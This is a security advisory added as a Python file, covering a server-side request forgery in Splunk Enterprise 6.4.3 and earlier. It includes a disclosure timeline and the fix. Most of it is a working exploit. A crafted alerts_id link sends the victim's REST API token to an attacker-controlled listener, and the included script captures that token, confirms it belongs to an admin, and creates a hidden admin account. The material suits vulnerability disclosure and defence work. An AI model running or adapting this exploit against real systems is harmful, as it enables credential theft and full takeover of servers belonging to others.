@@ -1,0 +1,146 @@
+'''
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Splunk Enterprise Server-Side Request Forgery
+Affected versions: Splunk Enterprise <= 6.4.3
+
+PDF:
+http://security-assessment.com/files/documents/advisory/SplunkAdvisory.pdf
+
++-----------+
+|Description|
++-----------+
+The Splunk Enterprise application is affected by a server-side request
+forgery vulnerability. This vulnerability can be exploited by an
+attacker via social engineering or other vectors to exfiltrate
+authentication tokens for the Splunk REST API to an external domain.
+
++------------+
+|Exploitation|
++------------+
+==Server-Side Request Forgery==
+
+A server-side request forgery (SSRF) vulnerability exists in the Splunk
+Enterprise web management interface within the Alert functionality. The
+application parses user supplied data in the GET parameter ‘alerts_id’
+to construct a HTTP request to the splunkd daemon listening on TCP port
+8089. Since no validation is carried out on the parameter, an attacker
+can specify an external domain and force the application to make a HTTP
+request to an arbitrary destination host. The issue is aggravated by the
+fact that the application includes the REST API token for the currently
+authenticated user within the Authorization request header.
+
+This vulnerability can be exploited via social engineering to obtain
+unauthorized access to the Splunk REST API with the same privilege level
+of the captured API token.
+
+[POC SSRF LINK]
+/en-US/alerts/launcher?eai%3Aacl.app=launcher&eai%3Aacl.owner=*&severity=*&alerts_id=[DOMAIN]&search=test
+
+The proof of concept below can be used to listen for SSRF connections
+and automatically create a malicious privileged user when an
+administrative token is captured.
+
+[POC - splunk-poc.py]
+'''
+
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import httplib
+import ssl
+import requests
+
+token = ''
+
+class MyHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        global token
+        try:
+            token = self.headers.get('Authorization')[7:]
+            print "[+] Captured Splunk API token from GET request"
+        except Exception, e:
+            print "[-] No API token captured on incoming connection..."
+
+def adminTokenNotCaptured():
+    global token
+    if token:
+        query = "/services/authentication/httpauth-tokens/" + token
+        conn = httplib.HTTPSConnection("<SPLUNK IP>", 8089,
+context=ssl._create_unverified_context())
+        conn.putrequest("GET", query)
+        conn.putheader("Authorization", "Splunk %s" % token)
+        conn.endheaders()
+        context = conn.getresponse().read()
+        if 'userName">admin' in context:
+            print "[+] Confirmed Splunk API token belongs to admin user"
+            print "[+] Admin Splunk API Token: %s" % token
+            return False
+        else:
+            print "[!] Splunk API token does not belong to admin user"
+
+    return True
+
+def poc():
+    global token
+    create_user_uri = "https://<SPLUNK
+IP>:8089/services/authentication/users"
+    params = {'name': 'infosec', 'password': 'password', 'roles': 'admin'}
+    auth_header = {'Authorization': 'Splunk %s' % token}
+    requests.packages.urllib3.disable_warnings()
+    response = requests.post(url=create_user_uri, data=params,
+headers=auth_header, verify=False)
+    if "<title>infosec" in response.content:
+       print "[+] POC admin account 'infosec:password' successfully
+created"
+    else:
+       print "[-] No account was created"
+       print response.content
+
+if __name__ == "__main__":
+    try:
+        print "[+] Starting HTTP Listener"
+        server = HTTPServer(("", 8080), MyHandler)
+        while adminTokenNotCaptured():
+            server.handle_request()
+        poc()
+    except KeyboardInterrupt:
+        print "[+] Stopping HTTP Listener"
+        server.socket.close()
+
+'''
++----------+
+| Solution |
++----------+
+Update to Splunk 6.5.0 or later. Full information about all patched
+versions are provided in the reference links below.
+
++------------+
+|  Timeline  |
++------------+
+24/08/2016 – Initial disclosure to vendor
+25/08/2016 – Vendor acknowledges receipt of the advisory and confirms
+vulnerability.
+28/09/2016 – Sent follow up email asking for status update
+30/09/2016 – Vendor replies fixes are being backported to all supported
+versions of the software.
+10/11/2016 – Vendor releases security advisory and patched software versions
+09/12/2016 – Public disclosure
+
++------------+
+| Additional |
++------------+
+http://security-assessment.com/files/documents/advisory/SplunkAdvisory.pdf
+https://www.splunk.com/view/SP-CAAAPSR [SPL-128840]
+'''
